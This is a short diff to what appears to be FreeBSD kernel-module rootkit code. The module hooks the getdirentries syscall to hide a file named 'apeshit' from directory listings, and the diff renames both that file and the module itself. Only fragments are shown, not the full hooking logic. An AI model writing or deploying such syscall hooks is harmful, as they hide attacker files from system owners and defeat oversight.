@@ -38,7 +38,7 @@
 // save orignal pointer 
 static sy_call_t *original_getdirentries;
 // filename we want to hide
-# define FILENAME_TO_HIDE "apeshit.sh"
+# define FILENAME_TO_HIDE "apeshit"
 
 // custom syscall that filters out filename
 static int custom_getdirentries(struct thread *td, void *args) {
@@ -479,7 +479,7 @@ static int event_handler(struct module *module, int event, void *arg) {
 }
 
 static moduledata_t module_data = {
-    "LD_PRELOAD",
+    "apeshit",
     event_handler,
     NULL
 };
